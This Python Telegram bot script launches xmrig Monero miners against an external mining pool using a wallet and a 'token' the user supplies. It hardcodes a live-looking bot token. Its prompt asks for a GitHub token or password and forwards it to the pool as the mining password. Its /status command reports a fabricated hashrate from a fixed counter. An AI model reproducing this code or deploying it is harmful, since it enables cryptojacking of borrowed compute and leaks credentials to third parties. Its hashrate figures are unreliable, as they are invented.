import os
import time
import subprocess
import threading
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = '7971605755:AAHAh9QO9BVS9dLAWYB4ZZ1XxCGZ-15Ut2M'
ADMIN_ID = 8179218740

user_data = {}
mining_jobs = {}
jobs_lock = threading.Lock()

def start_mining_process(wallet, token):
    try:
        return subprocess.Popen([
            "./xmrig",
            "-o", "gulf.moneroocean.stream:10128",
            "-a", "rx",
            "-u", wallet,
            "-p", token,
            "--donate-level=1",
            "--randomx-1gb-pages"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print("❌ Failed to start xmrig:", str(e))
        return None

async def start_mining(user_id, wallet, token):
    with jobs_lock:
        if user_id in mining_jobs:
            for job in mining_jobs[user_id]:
                try:
                    job['proc'].terminate()
                except:
                    pass
        mining_jobs[user_id] = []
        for _ in range(4):
            proc = start_mining_process(wallet, token)
            if proc:
                job_info = {
                    'proc': proc,
                    'start_time': time.time(),
                    'hashes': 0
                }
                mining_jobs[user_id].append(job_info)

        def simulate_hashes():
            while True:
                time.sleep(1)
                with jobs_lock:
                    if user_id not in mining_jobs or not mining_jobs[user_id]:
                        break
                    for job in list(mining_jobs[user_id]):
                        if job['proc'].poll() is not None:
                            mining_jobs[user_id].remove(job)
                            continue
                        job['hashes'] += 1000  # Simulate 1 KH/s

        threading.Thread(target=simulate_hashes, daemon=True).start()

async def wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ Use /wallet <your_xmr_wallet>")
        return
    user_data[user_id] = user_data.get(user_id, {})
    user_data[user_id]['wallet'] = context.args[0]
    await update.message.reply_text(f"✅ Wallet saved.")
    if 'token' in user_data[user_id]:
        await start_mining(user_id, user_data[user_id]['wallet'], user_data[user_id]['token'])
        await update.message.reply_text("🚀 Mining started with 4 threads!")

async def token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if len(context.args) != 1:
        await update.message.reply_text("❌ Use /token <github_token_or_password>")
        return
    user_data[user_id] = user_data.get(user_id, {})
    user_data[user_id]['token'] = context.args[0]
    await update.message.reply_text("✅ Token saved.")
    if 'wallet' in user_data[user_id]:
        await start_mining(user_id, user_data[user_id]['wallet'], user_data[user_id]['token'])
        await update.message.reply_text("🚀 Mining started with 4 threads!")

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    with jobs_lock:
        if user_id not in mining_jobs or not mining_jobs[user_id]:
            await update.message.reply_text("⚠️ No mining jobs running.")
            return
        total_hashes = sum(job['hashes'] for job in mining_jobs[user_id])
        total_uptime = sum(time.time() - job['start_time'] for job in mining_jobs[user_id])
        avg_uptime = total_uptime / len(mining_jobs[user_id])
        hashrate = int(total_hashes / avg_uptime) if avg_uptime > 0 else 0
        msg = (
            f"⛏️ Mining Status:\n"
            f"Threads: {len(mining_jobs[user_id])}\n"
            f"Total Hashes: {total_hashes}\n"
            f"Average Uptime: {int(avg_uptime)} sec\n"
            f"Approx Hashrate: {hashrate} H/s"
        )
        await update.message.reply_text(msg)

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    with jobs_lock:
        if user_id in mining_jobs:
            for job in mining_jobs[user_id]:
                try:
                    job['proc'].terminate()
                except:
                    pass
            mining_jobs[user_id] = []
    await update.message.reply_text("🛑 Mining stopped.")

async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Use /wallet <wallet> and /token <password> to begin mining.")

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "/wallet <your_wallet>\n"
        "/token <password>\n"
        "/status - Mining stats\n"
        "/stop - Stop mining\n"
        "/help - Show this menu"
    )

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("wallet", wallet))
    app.add_handler(CommandHandler("token", token))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("help", help_cmd))
    print("🚀 Bot running...")
    app.run_polling()

if __name__ == "__main__":
    main()